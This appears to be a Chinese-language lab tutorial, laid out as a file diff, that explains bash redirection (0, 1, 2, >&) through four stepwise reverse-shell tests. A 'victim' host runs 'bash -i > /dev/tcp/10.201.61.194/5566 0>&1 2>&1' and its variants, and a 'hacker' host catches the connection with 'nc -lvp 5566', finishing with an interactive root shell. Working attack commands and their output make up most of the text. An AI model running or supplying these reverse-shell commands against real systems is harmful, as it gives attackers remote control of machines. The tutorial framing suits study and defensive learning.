@@ -1,0 +1,85 @@
+注：&>或>& 表示混合输出，即标准输出1 + 错误输出2
+>是重定向符，就是把前面输出的内容重定向到后面指定的位置
+一般来说, "1>" 通常可以省略成 ">".
+1>&2 正确返回值传递给2输出通道 &2表示2输出通道 
+如果此处错写成 1>2, 就表示把1输出重定向到文件2中. 
+0 标准输入 1 标准输出 2标准错误输出
+---------------------------------------------------------------------------------------------------------
+bash -i > /dev/tcp/10.201.61.194/5566
+[root@victim ~]# bash -i > /dev/tcp/10.201.61.194/5566        //第二步   因为  1>/dev/tcp/10.201.61.194/5566  把标准输出传到攻击者端口
+[root@victim ~]# hostname        //第三步
+[root@victim ~]#
+
+攻击端：
+
+[root@hacker ~]# nc -lvp 5566      //第一步
+
+Ncat: Version 7.50 ( https://nmap.org/ncat )
+Ncat: Listening on :::5566
+Ncat: Listening on 0.0.0.0:5566
+Ncat: Connection from 10.201.61.195.
+Ncat: Connection from 10.201.61.195:49018.
+
+victim      //测试1结果：实现了将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。
+------------------------------------------------------------------------------------------------------------
+
+[root@victim ~]# bash -i < /dev/tcp/10.201.61.194/5566        //第二步     因为  1 < /dev/tcp/10.201.61.194/5566    把攻击者端口传到标准输出
+[root@victim ~]# hostname        //测试2结果：实现了将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。
+victim
+
+ 攻击端：
+
+[root@hacker ~]# nc -lvp 5566        //第一步
+Ncat: Version 7.50 ( https://nmap.org/ncat )
+Ncat: Listening on :::5566
+Ncat: Listening on 0.0.0.0:5566c
+Ncat: Connection from 10.201.61.195.
+Ncat: Connection from 10.201.61.195:50412.
+hostname        //第三步（攻击端执行命令）
+---------------------------------------------------------------------------------------------------------
+
+
+受害端：
+
+[root@victim ~]# bash -i > /dev/tcp/10.201.61.194/5566 0>&1        //第二步  就是 0(输入)传到1 1传到我们端口
+[root@victim ~]# hostname        //受害端回显命令
+[root@victim ~]# id        //受害端回显命令
+[root@victim ~]# hahaha        //受害端回显命令
+bash: hahaha: command not found        //受害端回显命令。显示错误命令的输出。
+[root@victim ~]#
+
+ 攻击端：
+
+[root@hacker ~]# nc -lvp 5566        //第一步
+Ncat: Version 7.50 ( https://nmap.org/ncat )
+Ncat: Listening on :::5566
+Ncat: Listening on 0.0.0.0:5566
+Ncat: Connection from 10.201.61.195.
+Ncat: Connection from 10.201.61.195:36792.
+hostname        //第三步（攻击端执行命令）
+victim
+id        //第四步（攻击端执行命令）
+uid=0(root) gid=0(root) groups=0(root)
+hahaha        //第五步（执行一个错误的命令）
+
+//测试3结果：基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出
+--------------------------------------------------------------------------------------------------------------------
+
+受害端：
+
+[root@victim ~]# bash -i > /dev/tcp/10.201.61.194/5566 0>&1 2>&1        2和0传到1  1传到我们的端口
+//第二步。或 # bash -i &> /dev/tcp/10.201.61.194/5566 0>&1  （注：&>或>& 表示混合输出，即标准输出1 + 错误输出2）
+
+攻击端：
+
+[root@hacker ~]# nc -lvp 5566        //第一步
+Ncat: Version 7.50 ( https://nmap.org/ncat )
+Ncat: Listening on :::5566
+Ncat: Listening on 0.0.0.0:5566
+Ncat: Connection from 10.201.61.195.
+Ncat: Connection from 10.201.61.195:51182.
+[root@victim ~]# hostname        //第三步。测试4结果：攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令~
+hostname
+victim
+
+//PS：由测试3、测试4对比可见，标准错误2不仅显示错误信息的作用，居然还有回显输入命令和终端提示符的作用~~~
